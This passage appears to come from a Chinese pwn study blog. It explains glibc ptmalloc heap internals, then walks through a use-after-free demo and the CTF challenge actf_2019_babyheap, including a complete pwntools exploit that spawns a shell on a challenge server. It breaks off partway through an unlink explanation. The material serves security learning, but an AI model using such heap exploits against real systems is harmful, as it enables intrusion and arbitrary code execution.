class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>INTERNAL_SIZE_T是用于内部管理块大小的字大小。默认版本与size_t相同。 </p>
<p>一般来说，size_t 在 64 位中是 64 位无符号整数，32 位中是 32 位无符号整数。</p>
<p><strong>prev_size</strong>：如果该 chunk 的<strong>物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）</strong>是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。<strong>这里的前一 chunk 指的是较低地址的 chunk</strong> 。</p>
<p>**size(堆大小对齐)*<em>：堆的大小必须是 2</em>SIZE_SZ 的整数倍，如果不是这样会自动转换成整数倍。32位下，SIZE_SZ&#x3D;4。64位下，SIZE_SZ&#x3D;8。32 位系统堆大小为 8 的倍数，64 位为 16 的倍数。由于 8 对应的 2 进制为1000，所以该字段的低三个比特位对 chunk 的大小没有影响，它们从高到低分别表示的是：</p>
<ul>
<li>NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。</li>
<li>IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。</li>
<li>PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。<strong>当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址</strong>。这也方便进行空闲 chunk 之间的合并。</li>
</ul>
<p><strong>fd、bk</strong>：chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中。</p>
<ul>
<li>fd：指向下一个（非物理相邻）空闲的 chunk</li>
<li>bk：指向上一个（非物理相邻）空闲的 chunk（仅为处于双向链表bin中的free chunk时生效）</li>
<li>通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理</li>
</ul>
<p><strong>fd_nextsize， bk_nextsize</strong>：仅为 large free chunk 时生效。</p>
<ul>
<li>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li>
<li>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li>
<li>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。<strong>这样做可以避免在寻找合适 chunk 时挨个遍历。</strong></li>
</ul>
<p>一个已被分配的 chunk 中，我们称前两个字段称为 chunk header，后面的部分称为 user data。每次 malloc 申请得到的内存指针，其实指向 user data 的起始处。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             User data starts here...                          .</span><br><span class="line">        .                                                               .</span><br><span class="line">        .             (malloc_usable_size() bytes)                      .</span><br><span class="line">next    .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             (size of chunk, but used for application data)    |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|1|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>

<p>被释放的 chunk 被记录在链表中（可能是循环双向链表，也可能是单向链表）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`head:&#x27; |             Size of chunk, in bytes                     |A|0|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Forward pointer to next chunk in list             |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Back pointer to previous chunk in list            |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Unused space (may be 0 bytes long)                .</span><br><span class="line">        .                                                               .</span><br><span class="line"> next   .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`foot:&#x27; |             Size of chunk, in bytes                           |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|0|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>

<p><strong>总结</strong>：如果一个chunk是空闲的，那有两处会记录它的大小。首先它本身的 size 字段会记录，其次下一个 chunk 也会记录。<strong>一般情况下</strong>，物理相邻的两个空闲 chunk 会被合并为一个 chunk 。堆管理器会通过 prev_size 字段以及 size 字段合并两个物理相邻的空闲 chunk 块。</p>
<h4 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h4><p>管理 arena 中空闲 chunk 的结构，以数组的形式存在，数组元素为相应大小的 chunk 链表的链表头，存在于 arena 的 malloc_state 中。</p>
<p>用户释放掉的 chunk 不会马上归还给系统，ptmalloc 会统一管理 heap 和 mmap 映射区域中的空闲的 chunk。当用户再一次请求分配内存时，ptmalloc 分配器会试图在空闲的 chunk 中挑选一块合适的给用户。这样可以避免频繁的系统调用，降低内存分配的开销。</p>
<h5 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h5><p>当用户需要的 chunk 的大小小于 fastbin 的最大大小时， ptmalloc 会首先判断 fastbin 中相应的 bin 中是否有对应大小的空闲块，如果有的话，就会直接从这个 bin 中获取 chunk。如果没有的话，ptmalloc 才会做接下来的一系列操作。</p>
<p>特点：</p>
<ol>
<li><p>LIFO</p>
</li>
<li><p>glibc 采用单向链表对其中的每个 bin 进行组织</p>
</li>
<li><p>支持的 chunk 大小一般为 64 字节，最大为 80 字节</p>
</li>
<li><p>fastbin 最多可以支持的 bin 的个数为 10 个，从数据空间为 8 字节开始一直到 80 字节</p>
</li>
</ol>
<p>ptmalloc 默认情况下会调用 set_max_fast(s) 将全局变量 global_max_fast 设置为 DEFAULT_MXFAST，也就是设置 fast bins 中 chunk 的最大值。当 MAX_FAST_SIZE 被设置为 0 时，系统就不会支持 fastbin 。</p>
<h5 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h5><p>每个 chunk 的大小与其所在的 bin 的 index 的关系为：chunk_size &#x3D; 2 * SIZE_SZ *index。</p>
<p>small bin 中共有 62 个循环双向链表，每个链表中存储的 chunk 大小是一致的。</p>
<p>chunk 的 大小从 （32）16-504 字节，（64）32-1008 字节</p>
<p>特点：</p>
<ol>
<li>每个链表都有链表头节点</li>
<li>采用循环双向链表结构，每个链表都遵循 FIFO 规则。</li>
<li>fast bin 中的 chunk 是有可能被放到 small bin 中去的（大小重合的部分）</li>
</ol>
<h5 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h5><p>一共包括 63 个 bin，每个 bin 中的 chunk 的大小不一致，而是处于一定区间范围内。此外，这 63 个 bin 被分成了 6 组，每组 bin 中的 chunk 大小之间的公差一致。</p>
<h5 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h5><p>unsorted bin 可以视为空闲 chunk 回归其所属 bin 之前的缓冲区。</p>
<p>unsorted bin 处于我们之前所说的 bin 数组下标 1 处。故而 unsorted bin 只有一个链表。且其中的 chunk 处于乱序状态。</p>
<p>其中的 chunk 有三个来源：</p>
<ol>
<li>一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</li>
<li>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。</li>
<li>当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话。</li>
</ol>
<p>使用情况：</p>
<ol>
<li>Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取。</li>
<li>在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中。</li>
</ol>
<h4 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h4><p>程序第一次进行 malloc 的时候，heap 会被分为两块，一块给用户，剩下的那块就是 top chunk。其实，所谓的 top chunk 就是处于当前堆的物理地址最高的 chunk。这个 chunk 不属于任何一个 bin，它的作用在于当所有的 bin 都无法满足用户请求的大小时，如果其大小不小于指定的大小，就进行分配，并将剩下的部分作为新的 top chunk。否则，就对 heap 进行扩展后再进行分配。在 main arena 中通过 sbrk 扩展 heap，而在 thread arena 中通过 mmap 分配新的 heap。</p>
<p>需要注意的是，top chunk 的 prev_inuse 比特位始终为 1，否则其前面的 chunk 就会被合并到 top chunk 中。</p>
<p><strong>初始情况下，我们可以将 unsorted chunk 作为 top chunk。</strong></p>
<h4 id="last-remainder"><a href="#last-remainder" class="headerlink" title="last remainder"></a>last remainder</h4><p>在用户使用 malloc 请求分配内存时，ptmalloc2 找到的 chunk 可能并不和申请的内存大小一致，这时候就将分割之后的剩余部分称之为 last remainder chunk ，会存放在 unsort bin 里。top chunk 分割剩下的部分不会作为 last remainder。</p>
<h3 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h3><p>arena 的数量和系统的核数有关：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">For 32 bit systems:</span><br><span class="line">     Number of arena = 2 * number of cores.</span><br><span class="line">For 64 bit systems:</span><br><span class="line">     Number of arena = 8 * number of cores.</span><br></pre></td></tr></table></figure>

<p>当线程数大于核数的二倍（超线程技术）时，就必然有线程处于等待状态，所以没有必要为每个线程分配一个 arena。</p>
<p>与 thread 不同的是，main arena 作为一个全局变量存在于 libc.so 数据段。</p>
<h3 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h3><p>用来记录线程所申请的 heap 区域信息的结构。</p>
<p>一般申请的 heap 是不连续的，因此需要记录不同 heap 之间的链接结构。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> HEAP_MIN_SIZE (32 * 1024)</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HEAP_MAX_SIZE</span></span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> DEFAULT_MMAP_THRESHOLD_MAX</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> HEAP_MAX_SIZE (2 * DEFAULT_MMAP_THRESHOLD_MAX)</span></span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> HEAP_MAX_SIZE (1024 * 1024) <span class="comment">/* must be a power of two */</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* HEAP_MIN_SIZE and HEAP_MAX_SIZE limit the size of mmap()ed heaps</span></span><br><span class="line"><span class="comment">   that are dynamically created for multi-threaded programs.  The</span></span><br><span class="line"><span class="comment">   maximum size must be a power of two, for fast determination of</span></span><br><span class="line"><span class="comment">   which heap belongs to a chunk.  It should be much larger than the</span></span><br><span class="line"><span class="comment">   mmap threshold, so that requests with a size just below that</span></span><br><span class="line"><span class="comment">   threshold can be fulfilled without creating too many heaps.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/***************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* A heap is a single contiguous memory region holding (coalesceable)</span></span><br><span class="line"><span class="comment">   malloc_chunks.  It is allocated with mmap() and always starts at an</span></span><br><span class="line"><span class="comment">   address aligned to HEAP_MAX_SIZE.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  mstate ar_ptr; <span class="comment">/* 堆对应的arena的地址 */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span> *<span class="title">prev</span>;</span> <span class="comment">/* 上一个heap_info的地址 */</span></span><br><span class="line">  <span class="type">size_t</span> size;   <span class="comment">/* 当前堆的大小 */</span></span><br><span class="line">  <span class="type">size_t</span> mprotect_size; <span class="comment">/* Size in bytes that has been mprotected</span></span><br><span class="line"><span class="comment">                           PROT_READ|PROT_WRITE.  */</span></span><br><span class="line">  <span class="comment">/* Make sure the following data is properly aligned, particularly</span></span><br><span class="line"><span class="comment">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span></span><br><span class="line"><span class="comment">     MALLOC_ALIGNMENT. 确保对齐*/</span></span><br><span class="line">  <span class="type">char</span> pad[<span class="number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</span><br><span class="line">&#125; heap_info;</span><br></pre></td></tr></table></figure>

<p>该数据结构是专门为从 Memory Mapping Segment 处申请的内存准备的，即为非主线程准备的。</p>
<h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><p>用于管理堆，记录每个 arena 当前申请的内存的具体状态(是否有空闲 chunk，有什么大小的空闲 chunk )。无论是 thread arena 还是 main arena，它们都只有一个 malloc state 结构。由于 thread 的 arena 可能有多个，malloc state 结构会在最新申请的 arena 中。</p>
<p>main arena 的 malloc_state 同样作为一个全局变量 存储在 libc.so 数据段。</p>
<h3 id="堆的实现"><a href="#堆的实现" class="headerlink" title="堆的实现"></a>堆的实现</h3><p>可以从宏观或微观的角度去考虑：</p>
<p>从宏观上，堆经历了 创建 ——&gt; 初始化——&gt; 销毁 的过程。</p>
<p>从微观上来说，这些操作对应着内存块的申请和释放。</p>
<h3 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h3><p>use-after-free 原理：释放一个堆块后，由于程序有漏洞(比如指针没置零)，可以对释放后的堆块进行改写。随即利用堆分配算法进行攻击。</p>
<p>原理以一段 C 代码为例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> target[<span class="number">100</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *p = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">free</span>(p);</span><br><span class="line">	p[<span class="number">0</span>] = target;             <span class="comment">// 使得 p_chunk-&gt;fd 指向 target</span></span><br><span class="line">	target[<span class="number">0</span>] = <span class="number">0</span>;			   <span class="comment">// prev_size</span></span><br><span class="line">	target[<span class="number">1</span>] = <span class="number">0x21</span>;          <span class="comment">// size</span></span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);              <span class="comment">// 返回 p</span></span><br><span class="line">	<span class="type">char</span> *q = <span class="built_in">malloc</span>(<span class="number">0x10</span>);    <span class="comment">// 再次 malloc 则会将 p_chunk-&gt;fd 的内容拿出来赋给 q</span></span><br><span class="line">    						   <span class="comment">// 即伪造好的target</span></span><br><span class="line">	<span class="built_in">memcpy</span>(q,<span class="string">&quot;hello&quot;</span>,<span class="number">6</span>);       <span class="comment">// 对 q 操作即对我们伪造的 chunk 进行操作</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,&amp;target[<span class="number">2</span>]);  <span class="comment">// 会输出什么呢？</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译运行，劫持成功：</p>
<img src="/2023/12/08/Pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/UAF.png" class="">

<h4 id="例题：actf-2019-babyheap"><a href="#例题：actf-2019-babyheap" class="headerlink" title="例题：actf_2019_babyheap"></a>例题：actf_2019_babyheap</h4><p>64位，除了 pie 保护全开。运行一下是标准的菜单题，提供了现成的 system 和 &#x2F;bin&#x2F;sh 字符串。</p>
<p>首先根据运行情况对 main 函数进行一些整理，如下：</p>
<img src="/2023/12/08/Pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/actf_2019_babyheap_1.png" class="">

<p>查看 delete 函数：</p>
<img src="/2023/12/08/Pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/actf_2019_babyheap_2.png" class="">

<p>free 前有检查，free 后却没有将指针设置为空值。</p>
<p>查看 create：</p>
<img src="/2023/12/08/Pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/actf_2019_babyheap_3.png" class="">

<p>当选择create选项时，会先创建 0x10 大小的 结构体，将它的后八位设置为 print_content 函数的地址。接着输入 content 的大小和内容，将 content 的地址存放在结构体的前八位。</p>
<p>再查看 print：</p>
<img src="/2023/12/08/Pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/actf_2019_babyheap_4.png" class="">

<p>分析到这里发现是很明显的 UAF 了，我们通过画图理一理思路：</p>
<img src="/2023/12/08/Pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/actf_2019_babyheap_5.png" class="">

<p>当我们两次调用 create 函数，首先分配的是 chunk0 和 chunk1 的结构体本身，再次会根据我们输入的 size 为 content 分配 chunk 空间。</p>
<p>当我们输入的 size 足够大远大于 0x10 时，根据堆空间的分配规则，只有两个大小为 0x10 的结构体本身会被放到 fast bin。</p>
<p>我们首先 free 结构体 0 和对应的 content 再 free 结构体 1。</p>
<p>再次申请 content 大小为 0x10 的堆块。则结构体本身与其 content 各占 0x10 个字节。</p>
<p>fast bin 遵循 LIFO 的原则，因此，对于率先分配的两块大小为 0x10 的空间，原先结构体 0 的空间对应新分配的 content，结构体 1 的空间对应新分配的结构体本身。而我们输入新的 content，就相当于在修改原先 结构体 0 的内容。</p>
<p>此时再调用 print(1)，即可 getshell。</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26484</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ACTF_2019_babyheap&#x27;</span>)</span><br><span class="line">bin_sh=<span class="number">0x602010</span></span><br><span class="line">system=elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#io=process(&#x27;./ACTF_2019_babyheap&#x27;)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">	io.recvuntil(<span class="string">&#x27;choice: &#x27;</span>)</span><br><span class="line">	io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	io.recvuntil(<span class="string">&#x27;size: &#x27;</span>)</span><br><span class="line">	io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">	io.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">	io.send(content)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">	io.recvuntil(<span class="string">&#x27;choice: &#x27;</span>)</span><br><span class="line">	io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	io.recvuntil(<span class="string">&#x27;index: &#x27;</span>)</span><br><span class="line">	io.send(<span class="built_in">str</span>(idx))</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">	io.recvuntil(<span class="string">&#x27;choice:&#x27;</span>)</span><br><span class="line">	io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	io.recvuntil(<span class="string">&#x27;index:&#x27;</span>)</span><br><span class="line">	io.send(<span class="built_in">str</span>(idx))</span><br><span class="line">	</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(bin_sh)+p64(system))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>俗称脱链，将链表头处的 free 堆块从 unsorted bin 中脱离出来，然后和物理地址相邻的新 free 的堆块合并成大堆块（向前或向后合并），再次放到 unsorted bin 里。</p>
<img src="/2023/12/08/Pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/unlink.png" class="">

<p>通过伪造 free 状态的 fake_chunk，伪造 fd 指针和 bk 指针，通过绕过 unlink 的检测实现 unlink。向 p 所在的位置写入 p - 0x18，实现任意地址写漏洞。</p>
<p>产生原因：offbynull、offbyone、堆溢出，修改了堆块的使用标志位。</p>
<p>查看 molloc.c 中的 _int_free 部分源码，这里以 glibc-2.28 为例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="comment">// 此时 p 指向的是当前的 malloc_chunk 结构体</span></span><br><span class="line"><span class="comment">// prev_inuse() 判断前一个堆块是否是使用状态，标志位为 0 则表示前一个堆块是 free 状态</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = prev_size (p); <span class="comment">// 提取前一个堆块的大小</span></span><br><span class="line">      size += prevsize;</span><br><span class="line">   <span class="comment">// 修改当前的 chunk 的指针，指向前一个 chunk</span></span><br><span class="line">      p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">      unlink(av, p, bck, fwd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Treat space at ptr + offset as a chunk */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="comment">// unlink 操作的实质就是将 P 所指向的 chunk 从双向链表中删除，这里的 FD 和 BK 作为临时变量被使用 </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            </span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      </span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);			      </span><br><span class="line">    FD = P-&gt;fd;								      </span><br><span class="line">    BK = P-&gt;bk;								      </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))		      </span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);			      </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// 这一步完成脱链</span></span><br><span class="line">        FD-&gt;bk = BK;							      </span><br><span class="line">        